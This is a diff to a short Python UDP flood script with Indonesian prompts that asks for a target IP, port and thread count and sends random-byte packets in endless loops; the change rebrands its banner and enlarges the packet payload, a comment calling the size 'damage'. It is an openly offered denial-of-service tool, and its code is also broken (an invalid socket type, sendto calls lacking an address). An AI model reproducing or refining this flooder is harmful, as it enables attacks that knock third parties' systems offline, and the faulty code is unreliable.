@@ -5,7 +5,7 @@ import random
 import threading
 import os,sys
 
-print("UBAH SERAH KALIAN")
+print("TOOL TOLOL BY VINZZ")
 
 ip_wibu = str(input("Ip Target : "))
 port_wibu = int(input("Port Target : "))
@@ -14,7 +14,7 @@ threads_wibu = int(input("Thread Dari Wibu : "))
 os.system("clear")
 
 def wibu():
-    asu = random._urandom(1024)#ubah angka urandom= damage
+    asu = random._urandom(999999)#ubah angka urandom= damage
     while True:
         try:
             s = socket.socket(socket.AF_INET , socket.SOCK_GRAM)
@@ -22,9 +22,9 @@ def wibu():
             s.sendto(asu)
             for x in range(paket_wibu):
                 s.sendto(asu)
-            print("[•] WIBU ATTACK!!!")
+            print("[•] VINZ WIBU ATTACK!!!")
         except:
-            print("[•] WIBU ATTACK!!!")
+            print("[•] VINZ WIBU ATTACK!!!")
 
 for y in range(threads_wibu):
     th = threading.Thread(target=wibu)
